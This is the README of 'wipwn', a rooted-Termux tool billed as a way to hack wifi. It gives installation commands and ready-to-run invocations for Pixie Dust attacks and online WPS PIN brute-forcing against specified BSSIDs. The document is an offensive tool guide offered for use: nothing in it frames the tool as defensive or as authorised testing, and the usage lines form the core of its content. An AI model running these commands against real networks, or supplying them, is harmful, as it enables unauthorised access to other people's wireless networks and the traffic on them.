# wipwn
Hack wifi using termux (rooted)

## <a href = "https://t.me/cybersh_official/127" > Tutorial</a>

### Installation :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python termux-api wpa-supplicant pixiewps iw -y
git clone https://github.com/ShTasrif/wipwn
pip install requests
cd wipwn
chmod +x wipwn.py
```
#### Help : `sudo python wipwn.py --help`
#### Example : `sudo python wipwn.py -i wlan0 -K`

#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
+ **Turn on Location.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python wipwn.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python wipwn.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python wipwn.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
#### Modify History : 
rofl0r => Biri_B@B@ => Mohammad_Alamin (Toxinum) => SH TASRIF (CYBER SH)
